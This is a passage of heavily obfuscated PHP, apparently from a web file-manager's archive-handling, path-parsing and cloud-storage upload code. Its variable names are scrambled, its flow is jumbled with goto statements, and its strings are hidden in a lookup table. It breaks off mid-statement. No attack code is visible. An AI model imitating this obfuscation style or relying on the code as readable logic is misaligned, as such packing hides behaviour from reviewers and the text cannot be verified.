$B‰‹ËÚ·Î[1024]; goto B‰£²®¨¤×; CÖù¨«™ôï: mk_dir($B„¼ºšî¹ó); $e»Á…†––ì = self::fileExt($B‰²³–âƒ‘); $AôÉ”˜œ´ê = $B„¼ºšî¹ó . $B‰‹ËÚ·Î[91] . $e»Á…†––ì; goto Eåà‘Œ…£; FâŠÛÓÉŒñ: Hook::trigger($B‰‹ËÚ·Î[1028], $B„¼ºšî¹ó); recursion_dir($B„¼ºšî¹ó, $Aº°†éƒŒ, $AïÆ³ùç‚, 0); $E¿Ä½ãÎÕŸ = array_merge($Aº°†éƒŒ, $AïÆ³ùç‚); goto D¨Û×¶ëÔÂ; eÅ–ÁÓå­: return !0; goto eõ³”šˆâ; a©ÏÍÃî¾°: if (!($B‰²³–âƒ‘ = parent::info($a Ö“º§Óß))) { show_json(LNG($B‰‹ËÚ·Î[1022]), !1); } if (!($AÍğ±äŠƒÓ = parent::infoFull($AÙ•ÛôßŸ))) { $AÙ•ÛôßŸ = parent::mkdir($AÙ•ÛôßŸ); $AÍğ±äŠƒÓ = array($B‰‹ËÚ·Î[75] => $AÙ•ÛôßŸ); } else { if (isset($AÍğ±äŠƒÓ[$B‰‹ËÚ·Î[369]]) && trim($AÍğ±äŠƒÓ[$B‰‹ËÚ·Î[75]], $B‰‹ËÚ·Î[8]) != trim($AÙ•ÛôßŸ, $B‰‹ËÚ·Î[8])) { $D„É¥—Æ = KodIO::make($AÍğ±äŠƒÓ[$B‰‹ËÚ·Î[461]]); $fŒÊÍêšÈñ = parent::fileNameAuto($D„É¥—Æ, $AÍğ±äŠƒÓ[$B‰‹ËÚ·Î[28]], REPEAT_RENAME_FOLDER, !0); $AÙ•ÛôßŸ = parent::mkdir($D„É¥—Æ . $fŒÊÍêšÈñ); $AÍğ±äŠƒÓ = array($B‰‹ËÚ·Î[75] => $AÙ•ÛôßŸ); } } $AÙ•ÛôßŸ = $AÍğ±äŠƒÓ[$B‰‹ËÚ·Î[75]]; goto F•˜¾Ôµ; F•˜¾Ôµ: $BÌ ãøÊîÚ = self::tmpFileName($B‰²³–âƒ‘); $B„¼ºšî¹ó = TEMP_FILES . $BÌ ãøÊîÚ; del_dir($B„¼ºšî¹ó); goto CÖù¨«™ôï; D¨Û×¶ëÔÂ: foreach ($E¿Ä½ãÎÕŸ as $Càš—––Óè) { $Càš—––Óè = self::iconvApp($Càš—––Óè); self::move($Càš—––Óè, $AÙ•ÛôßŸ, $e†×ß±ó); } del_dir($B„¼ºšî¹ó); if (!$A¿á¢Ç¬º) { del_file($AôÉ”˜œ´ê); } goto eÅ–ÁÓå­; eõ³”šˆâ: } public static function unzipList($Cä˜óè²¨Ô) { goto d—ò¯ß¢¿; a·Øä« : $d÷ÖÚí×õ = 50000; if (request_url_safe($dº©©ÉÏ«)) { $bÄƒĞ‰„Ê’ = parse_url_query($dº©©ÉÏ«); if (!isset($bÄƒĞ‰„Ê’[$FÃ…Î½¶†š[75]])) { show_json($FÃ…Î½¶†š[1030], !1); } } $D’¥à÷Ò¯‹ = isset($bÄƒĞ‰„Ê’) ? $bÄƒĞ‰„Ê’[$FÃ…Î½¶†š[75]] : $dº©©ÉÏ«; goto cñ¼…ŒÌ·¯; aéãÈºÆÇ«: return $b¶¼§›´Æï[$FÃ…Î½¶†š[1027]]; goto b¤‚¹Ñ›˜Õ; cñ¼…ŒÌ·¯: $a­‹¼©éõ = self::info($D’¥à÷Ò¯‹); $bÆÀˆ²œÖ = self::fileExt($a­‹¼©éõ); $döŒÍÛâ = self::tmpFileName($a­‹¼©éõ); goto C–ã¤“‡™›; e„”×›Óê: self::archiveExt(); del_dir($CñææµŒ); if (!$b¶¼§›´Æï[$FÃ…Î½¶†š[1025]]) { show_json($b¶¼§›´Æï[$FÃ…Î½¶†š[1027]], !1); } goto F¥’â·ï©õ; DÃøÓ¬ÍØ: $C­æÂäºğ = self::iconvSystem($C­æÂäºğ); if ($e«¯àëòÖ§ >= 0) { $D‡«Å¥¹¿ö = isset($Cä˜óè²¨Ô[$FÃ…Î½¶†š[1033]]) ? $Cä˜óè²¨Ô[$FÃ…Î½¶†š[1033]] : !1; $FÆÇ†¾Ëç = isset($Cä˜óè²¨Ô[$FÃ…Î½¶†š[28]]) ? $Cä˜óè²¨Ô[$FÃ…Î½¶†š[28]] : $FÃ…Î½¶†š[33]; KodArchive::filePreview($C­æÂäºğ, $e«¯àëòÖ§, $D‡«Å¥¹¿ö, $FÆÇ†¾Ëç); self::archiveExt(); die; } $b¶¼§›´Æï = KodArchive::listContent($C­æÂäºğ); goto e„”×›Óê; C–ã¤“‡™›: if (isset($bÄƒĞ‰„Ê’)) { $FÈœ¶²÷¼î = array($bÄƒĞ‰„Ê’[$FÃ…Î½¶†š[75]], $bÄƒĞ‰„Ê’[$FÃ…Î½¶†š[1029]], $bÄƒĞ‰„Ê’[$FÃ…Î½¶†š[28]]); $DºÑÚÛíà“ = md5(implode($FÃ…Î½¶†š[70], $FÈœ¶²÷¼î)) . $FÃ…Î½¶†š[91] . get_path_ext($bÄƒĞ‰„Ê’[$FÃ…Î½¶†š[28]]); } else { $FÈœ¶²÷¼î = array($a­‹¼©éõ[$FÃ…Î½¶†š[28]], $a­‹¼©éõ[$FÃ…Î½¶†š[75]], $a­‹¼©éõ[$FÃ…Î½¶†š[77]]); $DºÑÚÛíà“ = md5(implode($FÃ…Î½¶†š[70], $FÈœ¶²÷¼î)) . $FÃ…Î½¶†š[91] . $bÆÀˆ²œÖ; } if ($e«¯àëòÖ§ == -1) { $b¢¢ğÁ…°œ = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\151\145\167\x2f{$döŒÍÛâ}\57{$DºÑÚÛíà“}\56\154\x6f\x67"; $C‹­‹à¥íÌ = self::infoFull($b¢¢ğÁ…°œ); if ($C‹­‹à¥íÌ) { $b¢¢ğÁ…°œ = $C‹­‹à¥íÌ[$FÃ…Î½¶†š[75]]; $C”Ò¸ä”£ = self::getContent($b¢¢ğÁ…°œ); if ($C”Ò¸ä”£) { $eµØÍÉÍÁ¿ = json_decode($C”Ò¸ä”£, !0); if (count($eµØÍÉÍÁ¿) >= $d÷ÖÚí×õ) { show_json(sprintf(LNG($FÃ…Î½¶†š[1031]), count($eµØÍÉÍÁ¿)), !1); } return $eµØÍÉÍÁ¿; } } else { $b¢¢ğÁ…°œ = self::mkfile($b¢¢ğÁ…°œ); } } $CñææµŒ = TEMP_FILES . $döŒÍÛâ; goto Eœ’•ì†¢µ; F¥’â·ï©õ: $eµØÍÉÍÁ¿ = json_encode($b¶¼§›´Æï[$FÃ…Î½¶†š[1027]]); self::setContent($b¢¢ğÁ…°œ, $eµØÍÉÍÁ¿); if (count($b¶¼§›´Æï[$FÃ…Î½¶†š[1027]]) >= $d÷ÖÚí×õ) { show_json(sprintf(LNG($FÃ…Î½¶†š[1031]), count($b¶¼§›´Æï[$FÃ…Î½¶†š[1027]])), !1); } goto aéãÈºÆÇ«; Eœ’•ì†¢µ: if (!is_dir($CñææµŒ)) { mk_dir($CñææµŒ); } $C­æÂäºğ = $CñææµŒ . $FÃ…Î½¶†š[8] . $DºÑÚÛíà“; if (!@file_exists(self::iconvSystem($C­æÂäºğ))) { if (isset($bÄƒĞ‰„Ê’)) { url_request($dº©©ÉÏ«, $FÃ…Î½¶†š[1032], $C­æÂäºğ); } else { $C¨â‡ÍÒ½ñ = self::localFilePath($dº©©ÉÏ«, $bÆÀˆ²œÖ); $C­æÂäºğ = $C¨â‡ÍÒ½ñ ? $C¨â‡ÍÒ½ñ : self::download($dº©©ÉÏ«, $C­æÂäºğ); } } goto DÃøÓ¬ÍØ; d—ò¯ß¢¿: $FÃ…Î½¶†š =& $_SERVER[Î¿—”òá]; $dº©©ÉÏ« = $Cä˜óè²¨Ô[$FÃ…Î½¶†š[75]]; $e«¯àëòÖ§ = isset($Cä˜óè²¨Ô[$FÃ…Î½¶†š[1029]]) ? $Cä˜óè²¨Ô[$FÃ…Î½¶†š[1029]] : -1; goto a·Øä« ; b¤‚¹Ñ›˜Õ: } private static function fileExt($A«ö¼öÖ±) { $a¹‹É”´·š =& $_SERVER[Î¿—”òá]; $E¸Â»‘ÙêØ = $A«ö¼öÖ±[$a¹‹É”´·š[160]]; if ($E¸Â»‘ÙêØ == $a¹‹É”´·š[1034]) { $c‡Äà™±ùÏ = $a¹‹É”´·š[1035]; if (substr($A«ö¼öÖ±[$a¹‹É”´·š[28]], -strlen($c‡Äà™±ùÏ)) == $c‡Äà™±ùÏ) { $E¸Â»‘ÙêØ = $a¹‹É”´·š[1036]; } } self::archiveExt($E¸Â»‘ÙêØ); return $E¸Â»‘ÙêØ; } private static function zipFileList($eéäˆÍ÷¶™, $E‘‚‹Í¥Äè = false) { $b™¯òÒ¥Û =& $_SERVER[Î¿—”òá]; $B…µÚ†§ÀË = array(); foreach ($eéäˆÍ÷¶™ as $E¤ÚôÈ²É¶) { $c‚•ÊÀ¥¼Â = $E¤ÚôÈ²É¶[$b™¯òÒ¥Û[75]]; if ($E‘‚‹Í¥Äè) { $c‚•ÊÀ¥¼Â = self::copy($E¤ÚôÈ²É¶[$b™¯òÒ¥Û[75]], $E‘‚‹Í¥Äè, $b™¯òÒ¥Û[741]); } if ($c‚•ÊÀ¥¼Â && self::local()->exist($c‚•ÊÀ¥¼Â)) { $B…µÚ†§ÀË[$E¤ÚôÈ²É¶[$b™¯òÒ¥Û[75]]] = $c‚•ÊÀ¥¼Â; } } if (!empty($B…µÚ†§ÀË)) { return array_values($B…µÚ†§ÀË); } show_json(LNG($b™¯òÒ¥Û[1037]), !1); } public static function tmpFileName($d•Ø›åÃ—) { $bÖç¯Šé¨ =& $_SERVER[Î¿—”òá]; $fæ¦„ø÷½˜ = array($d•Ø›åÃ—[$bÖç¯Šé¨[28]], $d•Ø›åÃ—[$bÖç¯Šé¨[75]], $d•Ø›åÃ—[$bÖç¯Šé¨[77]], $d•Ø›åÃ—[$bÖç¯Šé¨[459]]); return md5(implode($bÖç¯Šé¨[70], $fæ¦„ø÷½˜)); } private static function localFilePath($b¶ãáš»“, $C¹í±œÈƒ¾) { goto fŠ–ôÎ«°; dù³çî¦™Ÿ: if ($bùÔÛã£Œ¬ == $d³ó§‰–É¯[102] || $bùÔÛã£Œ¬ == $d³ó§‰–É¯[1041]) { if (!$FİÂ÷ŒáÍ“->exist($FİÂ÷ŒáÍ“->path)) { show_json(LNG($d³ó§‰–É¯[101]), !1); } return $FİÂ÷ŒáÍ“->path; } return !1; goto f´˜¶äµ†ƒ; fŠ–ôÎ«°: $d³ó§‰–É¯ =& $_SERVER[Î¿—”òá]; if ($C¹í±œÈƒ¾ == $d³ó§‰–É¯[1038] && strtoupper(substr(PHP_OS, 0, 3)) == $d³ó§‰–É¯[1039]) { return !1; } $b Ğªá‘á– = KodIO::parse($b¶ãáš»“); goto cõ›ôó†Ä–; cõ›ôó†Ä–: if ($b Ğªá‘á–[$d³ó§‰–É¯[29]] == KodIO::KOD_SOURCE) { $eŠÆ×·£Ôõ = Model($d³ó§‰–É¯[749])->fileInfoGet(KodIO::sourceID($b¶ãáš»“)); if (!$eŠÆ×·£Ôõ[$d³ó§‰–É¯[75]]) { show_json($d³ó§‰–É¯[1040], !1); } $b¶ãáš»“ = $eŠÆ×·£Ôõ[$d³ó§‰–É¯[75]]; } $FİÂ÷ŒáÍ“ = self::init($b¶ãáš»“); $bùÔÛã£Œ¬ = $FİÂ÷ŒáÍ“->getType(); goto dù³çî¦™Ÿ; f´˜¶äµ†ƒ: } private static function archiveExt($DÕÃÓğ‘ ¤ = '') { $GLOBALS[$_SERVER[Î¿—”òá][1042]] = $DÕÃÓğ‘ ¤; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\162\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\162\x52\145\x63\171\143\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\165\163\145\162\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\x72\106\x69\x6c\x65\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\162\x46\151\154\x65\124\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\165\160\x52\x6f\157\164\x53\145\x6c\146\175"; const KOD_USER_SHARE = "\173\x75\x73\145\x72\x53\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\x72\123\150\141\162\145\x4c\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\162\145\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\x72\145\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\x72\x65\111\x74\x65\155\x4c\151\156\153\175"; const KOD_SEARCH = "\x7b\163\x65\x61\162\x63\150\175"; const KOD_BLOCK = "\173\142\154\157\x63\153\175"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\173\165\x73\x65\162\x52\145\156\x63\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\151\166\145\x72\175"; public static function typeList() { $bŠÑæÊƒ =& $_SERVER[Î¿—”òá]; return array($bŠÑæÊƒ[1043] => self::KOD_SOURCE, $bŠÑæÊƒ[1044] => self::KOD_USER_RECYCLE, $bŠÑæÊƒ[1045] => self::KOD_USER_FAV, $bŠÑæÊƒ[1046] => self::KOD_USER_FILE_TAG, $bŠÑæÊƒ[1047] => self::KOD_USER_FILE_TYPE, $bŠÑæÊƒ[1048] => self::KOD_GROUP_ROOT_SELF, $bŠÑæÊƒ[1049] => self::KOD_USER_SHARE, $bŠÑæÊƒ[1050] => self::KOD_USER_SHARE_LINK, $bŠÑæÊƒ[1051] => self::KOD_USER_SHARE_TO_ME, $bŠÑæÊƒ[1052] => self::KOD_SHARE_ITEM, $bŠÑæÊƒ[1053] => self::KOD_SHARE_LINK, $bŠÑæÊƒ[1054] => self::KOD_SEARCH, $bŠÑæÊƒ[1055] => self::KOD_BLOCK, $bŠÑæÊƒ[1056] => self::KOD_IO, $bŠÑæÊƒ[1057] => self::KOD_USER_RECENT, $bŠÑæÊƒ[1058] => self::KOD_USER_DRIVER); } public static function parse($D×Ñ»øã§) { goto bÄÚ÷÷°­¶; bÄÚ÷÷°­¶: $FßçÅÓ¾ê¥ =& $_SERVER[Î¿—”òá]; $D×Ñ»øã§ = self::clear($D×Ñ»øã§); $EÌİÜã¦Ş— = array_values(self::typeList()); goto Bš…½ÛãŠ; E‘…í“ù”İ: $c†§Å¦·„¤ = array($FßçÅÓ¾ê¥[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $cí”çîšÕ[$FßçÅÓ¾ê¥[1063]] = in_array($cí”çîšÕ[$FßçÅÓ¾ê¥[29]], $c†§Å¦·„¤); return $cí”çîšÕ; goto d›¦Ë”çŠ¡; Bš…½ÛãŠ: preg_match($FßçÅÓ¾ê¥[1059], $D×Ñ»øã§, $AšĞœİÄ ); $cí”çîšÕ = array($FßçÅÓ¾ê¥[388] => !1, $FßçÅÓ¾ê¥[1060] => !1, $FßçÅÓ¾ê¥[385] => !1, $FßçÅÓ¾ê¥[75] => $D×Ñ»øã§, $FßçÅÓ¾ê¥[1006] => !1, $FßçÅÓ¾ê¥[1005] => $FßçÅÓ¾ê¥[33]); if (is_array($AšĞœİÄ ) && count($AšĞœİÄ ) == 5) { $CĞé‚ª„ÊÔ = $FßçÅÓ¾ê¥[1061] . $AšĞœİÄ [2] . $FßçÅÓ¾ê¥[315]; if (in_array($CĞé‚ª„ÊÔ, $EÌİÜã¦Ş—)) { $cí”çîšÕ[$FßçÅÓ¾ê¥[1006]] = $AšĞœİÄ [1]; $cí”çîšÕ[$FßçÅÓ¾ê¥[29]] = $CĞé‚ª„ÊÔ; $cí”çîšÕ[$FßçÅÓ¾ê¥[1062]] = substr($CĞé‚ª„ÊÔ, 1, -1); $cí”çîšÕ[$FßçÅÓ¾ê¥[367]] = $AšĞœİÄ [3]; } $cí”çîšÕ[$FßçÅÓ¾ê¥[1005]] = $AšĞœİÄ [4]; } goto E‘…í“ù”İ; d›¦Ë”çŠ¡: } public static function clear($B®Ğ›óè­Š) { goto dºæ›õº’â; Bğíƒöå×á: $EáÒÂ¡æ‡Ù = $AÂÊÄ¦´Ó[1064]; if (substr($B®Ğ›óè­Š, 0, 3) == $AÂÊÄ¦´Ó[1065]) { $B®Ğ›óè­Š = substr($B®Ğ›óè­Š, 3); } while (strstr($B®Ğ›óè­Š, $EáÒÂ¡æ‡Ù)) { $B®Ğ›óè­Š = str_replace($EáÒÂ¡æ‡Ù, $AÂÊÄ¦´Ó[8], $B®Ğ›óè­Š); } goto dâ†×¯Ú²ß; dºæ›õº’â: $AÂÊÄ¦´Ó =& $_SERVER[Î¿—”òá]; $B®Ğ›óè­Š = str_replace(array($AÂÊÄ¦´Ó[985], $AÂÊÄ¦´Ó[217]), $AÂÊÄ¦´Ó[50], $B®Ğ›óè­Š); $B®Ğ›óè­Š = str_replace($AÂÊÄ¦´Ó[93], $AÂÊÄ¦´Ó[8], $B®Ğ›óè­Š); goto Bğíƒöå×á; dâ†×¯Ú²ß: $B®Ğ›óè­Š = preg_replace($AÂÊÄ¦´Ó[1066], $AÂÊÄ¦´Ó[8], $B®Ğ›óè­Š); if ($B®Ğ›óè­Š == $AÂÊÄ¦´Ó[8]) { return $AÂÊÄ¦´Ó[8]; } $B®Ğ›óè­Š = rtrim($B®Ğ›óè­Š, $AÂÊÄ¦´Ó[8]); goto Eêˆ¹™»²; Eêˆ¹™»²: return $B®Ğ›óè­Š; goto BÛ±ê·’Ç¹; BÛ±ê·’Ç¹: } public static function sourceID($f™×ªâ½²–) { $a‰‡îê÷²® =& $_SERVER[Î¿—”òá]; $fäÅ±ï¾ = self::parse($f™×ªâ½²–); if ($fäÅ±ï¾[$a‰‡îê÷²®[29]] !== self::KOD_SOURCE) { show_json(LNG($a‰‡îê÷²®[1067]), !1); } return $fäÅ±ï¾[$a‰‡îê÷²®[367]]; } public static function make($C™©ÅŒÑ¼) { if (!$C™©ÅŒÑ¼) { return !1; } return self::makePath(self::KOD_SOURCE, intval($C™©ÅŒÑ¼)); } public static function makeShare($Féî§à„Õ‹, $AŞÙƒùÙê) { return self::makePath(self::KOD_SHARE_ITEM, $Féî§à„Õ‹, $AŞÙƒùÙê); } public static function makeFileTypePath($b°º›ÙÃ¾) { return self::makePath(self::KOD_USER_FILE_TYPE, $b°º›ÙÃ¾); } public static function makeFileTagPath($A­Á•ßº„Ê) { return self::makePath(self::KOD_USER_FILE_TAG, $A­Á•ßº„Ê); } public static function makePath($eĞ†â°ˆã, $d°Ñ®ƒáÂ = '', $DØ³Óôä¿ì = '') { $DÚ›¼æ£‡Œ =& $_SERVER[Î¿—”òá]; $dğÊİ£´²Ó = substr($eĞ†â°ˆã, 1, -1); $c•§ÌˆæòÀ = $DÚ›¼æ£‡Œ[1068] . $dğÊİ£´²Ó . $DÚ›¼æ£‡Œ[1069] . $d°Ñ®ƒáÂ . $DÚ›¼æ£‡Œ[1070]; $c•§ÌˆæòÀ = $DØ³Óôä¿ì ? $c•§ÌˆæòÀ . $DØ³Óôä¿ì . $DÚ›¼æ£‡Œ[8] : $c•§ÌˆæòÀ; return $c•§ÌˆæòÀ; } public static function hashPath($CöÔ—±âªÑ) { $a¦¿¸Ó‡Ã¾ =& $_SERVER[Î¿—”òá]; $eËØÇÕÔ¯˜ = is_array($CöÔ—±âªÑ) ? $CöÔ—±âªÑ : IO::info($CöÔ—±âªÑ); $EÑÌ·Ü¶‡Ö = _get($eËØÇÕÔ¯˜, $a¦¿¸Ó‡Ã¾[1071], $a¦¿¸Ó‡Ã¾[33]); if (!$EÑÌ·Ü¶‡Ö) { $EÂ‹Öƒ’åÓ = KodIO::parse($eËØÇÕÔ¯˜[$a¦¿¸Ó‡Ã¾[75]]); if (!$EÂ‹Öƒ’åÓ[$a¦¿¸Ó‡Ã¾[29]]) { $EÑÌ·Ü¶‡Ö = IO::hashSimple($eËØÇÕÔ¯˜[$a¦¿¸Ó‡Ã¾[75]]); } } if (!$EÑÌ·Ü¶‡Ö) { $EÑÌ·Ü¶‡Ö = md5($eËØÇÕÔ¯˜[$a¦¿¸Ó‡Ã¾[75]] . $eËØÇÕÔ¯˜[$a¦¿¸Ó‡Ã¾[77]] . $eËØÇÕÔ¯˜[$a¦¿¸Ó‡Ã¾[107]]); } return $EÑÌ·Ü¶‡Ö; } public static function initSystemPath() { $AÉÎ– ëã =& $_SERVER[Î¿—”òá]; if (defined($AÉÎ– ëã[1072])) { return; } define($AÉÎ– ëã[1072], self::systemPath($AÉÎ– ëã[1073])); define($AÉÎ– ëã[1074], self::systemPath($AÉÎ– ëã[1075])); define($AÉÎ– ëã[1076], self::systemPath($AÉÎ– ëã[1077])); define($AÉÎ– ëã[1078], self::systemPath($AÉÎ– ëã[1079])); } private static function systemPath($Dµ½ ÆëÀí) { goto d—Ñ¶šÀ‡ ; f Îñï“: return $F¢ÙÄÅóÀÎ; goto D‰òƒ¢Ğòæ; D¹Š ¢á¹º: if ($F¢ÙÄÅóÀÎ) { return $F¢ÙÄÅóÀÎ; } if ($Dµ½ ÆëÀí == $eêâõİ…§‰[1073]) { $F¢ÙÄÅóÀÎ = self::make(Model($eêâõİ…§‰[749])->systemRootPathAdd($eêâõİ…§‰[1082])); } else { $F¢ÙÄÅóÀÎ = self::systemPath($eêâõİ…§‰[1073]); $Eö´£””¬ö = self::sourceID($F¢ÙÄÅóÀÎ); $F¢ÙÄÅóÀÎ = self::make(Model($eêâõİ…§‰[749])->mkdir($Eö´£””¬ö, $Dµ½ ÆëÀí)); } Model($eêâõİ…§‰[1081])->set($B‰¦§°ƒÆö, $F¢ÙÄÅóÀÎ); goto f Îñï“; d—Ñ¶šÀ‡ : $eêâõİ…§‰ =& $_SERVER[Î¿—”òá]; $B‰¦§°ƒÆö = $eêâõİ…§‰[1080] . ucfirst($Dµ½ ÆëÀí); $F¢ÙÄÅóÀÎ = Model($eêâõİ…§‰[1081])->get($B‰¦§°ƒÆö); goto D¹Š ¢á¹º; D‰òƒ¢Ğòæ: } public static function systemFolder($B«òÖÜîè) { $B†¡–ºªš = IO_PATH_SYSTEM_SOURCE . $B«òÖÜîè; $EÑÉ¯«Íéë = Cache::get($B†¡–ºªš); if (!$EÑÉ¯«Íéë) { $DÈÌ¨óÔæ = IO::infoFull($B†¡–ºªš); if (!$DÈÌ¨óÔæ) { $EÑÉ¯«Íéë = IO::mkdir($B†¡–ºªš, REPEAT_SKIP); } else { $EÑÉ¯«Íéë = $DÈÌ¨óÔæ[$_SERVER[Î¿—”òá][75]]; } Cache::set($B†¡–ºªš, $EÑÉ¯«Íéë, 3600 * 10); } return $EÑÉ¯«Íéë; } public static function defaultDriver() { return Model($_SERVER[Î¿—”òá][700])->defaultDriver(); } public static function defaultIO() { $a…óŞô¾Œ =& $_SERVER[Î¿—”òá]; $bª´Ó…“µ¼ = self::defaultDriver(); return $a…óŞô¾Œ[1083] . $bª´Ó…“µ¼[$a…óŞô¾Œ[367]] . $a…óŞô¾Œ[1070]; } public static function defaultDriverInit() { static $dÍŸß›¤  = false; if ($dÍŸß›¤ ) { return $dÍŸß›¤ ; } $dÍŸß›¤  = IO::init(self::defaultIO()); return $dÍŸß›¤ ; } public static function fileTypeList() { $dÈêòÜ“–« =& $_SERVER[Î¿—”òá]; $DŸ”Œ’ËÛš = $GLOBALS[$dÈêòÜ“–«[6]][$dÈêòÜ“–«[1084]]; foreach ($DŸ”Œ’ËÛš as $d²¾‹ª°Ô¶ => $B„‰Šè˜µÀ) { $C‘•ŠÖºØ„ = $dÈêòÜ“–«[1085] . $d²¾‹ª°Ô¶; $a–Óµ½“ = LNG($C‘•ŠÖºØ„); if ($C‘•ŠÖºØ„ != $a–Óµ½“) { $DŸ”Œ’ËÛš[$d²¾‹ª°Ô¶][$dÈêòÜ“–«[28]] = $a–Óµ½“; } } return $DŸ”Œ’ËÛš; } public static function transferType($AĞò­«¤í…, $e´Ô‘É´×) { goto E³­…±Ú†î; E³­…±Ú†î: $Aõ—½”ƒ²Ş =& $_SERVER[Î¿—”òá]; $B¡Ä–éùè’ = self::driverType($AĞò­«¤í…); $c”´–š«® = self::driverType($e´Ô‘É´×); goto b×Ö›•†îÎ; b×Ö›•†îÎ: if ($B¡Ä–éùè’[$Aõ—½”ƒ²Ş[29]] == $c”´–š«®[$Aõ—½”ƒ²Ş[29]] && $B¡Ä–éùè’[$Aõ—½”ƒ²Ş[1086]] == $c”´–š«®[$Aõ—½”ƒ²Ş[1086]]) { return $Aõ—½”ƒ²Ş[1087]; } if ($B¡Ä–éùè’[$Aõ—½”ƒ²Ş[29]] == $Aõ—½”ƒ²Ş[776] && $c”´–š«®[$Aõ—½”ƒ²Ş[29]] == $Aõ—½”ƒ²Ş[102]) { return $Aõ—½”ƒ²Ş[1033]; } if ($B¡Ä–éùè’[$Aõ—½”ƒ²Ş[29]] == $Aõ—½”ƒ²Ş[102] && $c”´–š«®[$Aõ—½”ƒ²Ş[29]] == $Aõ—½”ƒ²Ş[776]) { return $Aõ—½”ƒ²Ş[103]; } goto e¯ÍœÇ¡ Ê; e¯ÍœÇ¡ Ê: return $Aõ—½”ƒ²Ş[1088]; goto EÔ®•“ÕÃ¢; EÔ®•“ÕÃ¢: } public static function driverType($aÏÛˆÓ‘Ç) { goto FŠ’Êç­Ôç; BÍ˜Çâ®îç: return array($e²ƒÓËõ‡[29] => $e²ƒÓËõ‡[776], $e²ƒÓËõ‡[1086] => $aÏÛˆÓ‘Ç->pathDriver, $e²ƒÓËõ‡[75] => $F¬á©…Øñ); goto Bª”Å÷†ÖÉ; FŠ’Êç­Ôç: $e²ƒÓËõ‡ =& $_SERVER[Î¿—”òá]; $F¬á©…Øñ = $aÏÛˆÓ‘Ç->path; $e˜¢…ÔºÇ = str_replace($e²ƒÓËõ‡[1089], $e²ƒÓËõ‡[33], strtolower($aÏÛˆÓ‘Ç->getType())); goto B¡š¿‹Ÿ‡Í; B¡š¿‹Ÿ‡Í: if ($e˜¢…ÔºÇ == $e²ƒÓËõ‡[690] || $e˜¢…ÔºÇ == $e²ƒÓËõ‡[1090] || $e˜¢…ÔºÇ == $e²ƒÓËõ‡[1091]) { $aÏÛˆÓ‘Ç = self::defaultDriverInit(); } else { if ($e˜¢…ÔºÇ == $e²ƒÓËõ‡[1041] || $e˜¢…ÔºÇ == $e²ƒÓËõ‡[1092]) { $aÏÛˆÓ‘Ç = IO::init($aÏÛˆÓ‘Ç->pathParse[$e²ƒÓËõ‡[991]]); } } $e˜¢…ÔºÇ = str_replace($e²ƒÓËõ‡[1089], $e²ƒÓËõ‡[33], strtolower($aÏÛˆÓ‘Ç->getType())); if ($e˜¢…ÔºÇ == $e²ƒÓËõ‡[102]) { return array($e²ƒÓËõ‡[29] => $e²ƒÓËõ‡[102], $e²ƒÓËõ‡[1086] => $e²ƒÓËõ‡[33], $e²ƒÓËõ‡[75] => $F¬á©…Øñ); } goto BÍ˜Çâ®îç; Bª”Å÷†ÖÉ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($bÆÏŸ›Ÿ‰) { parent::__construct($bÆÏŸ›Ÿ‰); $this->signatureVersion($_SERVER[Î¿—”òá][200]); } public function uploadFormData($CƒÊÎ‚‡é¨, $AÂ¬Ç‘å¾Æ = 3600) { goto A²ŠÀá‹Şƒ; F–¼¤ÌçĞá: $Dåãí†ßÁÓ = array($c±ÀÅ¤‡¦š[1095] => $Fùö­‡êîÍ, $c±ÀÅ¤‡¦š[1096] => array(array($c±ÀÅ¤‡¦š[1097] => $bˆ’‘À¤ã¼), array($c±ÀÅ¤‡¦š[1098] => $this->bucket), array($c±ÀÅ¤‡¦š[1099], $c±ÀÅ¤‡¦š[1100], $c±ÀÅ¤‡¦š[33]), array($c±ÀÅ¤‡¦š[1101] => $EøÙ‹™³ùÍ), array($c±ÀÅ¤‡¦š[1102] => $dæÆåÑÒç˜), array($c±ÀÅ¤‡¦š[1103] => $this->accessKey), array($c±ÀÅ¤‡¦š[1104] => $d£ØÕ¸¤‡Ó))); $Dåãí†ßÁÓ = json_encode($Dåãí†ßÁÓ); $A••ñ£Î·ƒ = hash_hmac($c±ÀÅ¤‡¦š[218], $d£ØÕ¸¤‡Ó, $this->secret); goto BÄôšï¦†É; A²«›İŒïñ: $EøÙ‹™³ùÍ = $c±ÀÅ¤‡¦š[1093]; $Fùö­‡êîÍ = gmdate($c±ÀÅ¤‡¦š[1094], time() + $AÂ¬Ç‘å¾Æ); $d£ØÕ¸¤‡Ó = (string) time() . $c±ÀÅ¤‡¦š[67] . (string) (time() + $AÂ¬Ç‘å¾Æ); goto F–¼¤ÌçĞá; A²ŠÀá‹Şƒ: $c±ÀÅ¤‡¦š =& $_SERVER[Î¿—”òá]; $bˆ’‘À¤ã¼ = $c±ÀÅ¤‡¦š[185]; $dæÆåÑÒç˜ = $c±ÀÅ¤‡¦š[218]; goto A²«›İŒïñ; bŒ‰£Ÿ»‡: return $Eï¶ÈÉÈ¿; goto Fê—»Œ É; BÄôšï¦†É: $A„íÆäÇ‘ = sha1($Dåãí†ßÁÓ); $DİÀ‡¾ Û = hash_hmac($c±ÀÅ¤‡¦š[218], $A„íÆäÇ‘, $A••ñ£Î·ƒ); $Eï¶ÈÉÈ¿ = array($c±ÀÅ¤‡¦š[1097] => $bˆ’‘À¤ã¼, $c±ÀÅ¤‡¦š[1101] => $EøÙ‹™³ùÍ, $c±ÀÅ¤‡¦š[1105] => 